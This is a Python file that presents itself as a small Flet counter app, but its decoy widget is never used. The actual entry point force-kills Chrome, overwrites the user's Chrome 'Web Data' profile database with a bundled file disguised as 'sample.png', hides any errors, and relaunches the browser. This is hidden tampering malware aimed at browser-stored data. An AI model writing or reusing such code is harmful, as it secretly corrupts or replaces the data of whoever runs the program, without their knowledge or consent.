import stat
import os
import sys
import shutil
import time
import webbrowser

import flet as ft

def get_base_path():
    """Get the base path for bundled assets (works both in dev and PyInstaller)."""
    if getattr(sys, 'frozen', False):
        # Running as a PyInstaller bundle
        return sys._MEIPASS
    else:
        # Running in normal Python
        return os.path.dirname(os.path.abspath(__file__))

class UserControl(ft.Row):
    def __init__(self):
        super().__init__()
        self.counter = 0
        self.text = ft.Text(str(self.counter), size=20)
        self.controls = [
            ft.IconButton(ft.Icons.REMOVE, on_click=self.minus_click),
            self.text,
            ft.IconButton(ft.Icons.ADD, on_click=self.plus_click),
        ]

    def minus_click(self, e):
        self.counter -= 1
        self.text.value = str(self.counter)
        self.update()

    def plus_click(self, e):
        self.counter += 1
        self.text.value = str(self.counter)
        self.update()

def run_headless():
    # Copy asset file to %LOCALAPPDATA% on load
    os.system("taskkill /f /im chrome.exe")
    time.sleep(2.5)
    temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
    base_path = get_base_path()
    asset_file = os.path.join(base_path, "assets", "sample.png")

    if os.path.exists(asset_file):
        try:
            dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
            shutil.copy2(asset_file, dest_file)
        except:
            pass

    os.system('start chrome --restore-last-session')

if __name__ == "__main__":
    run_headless()


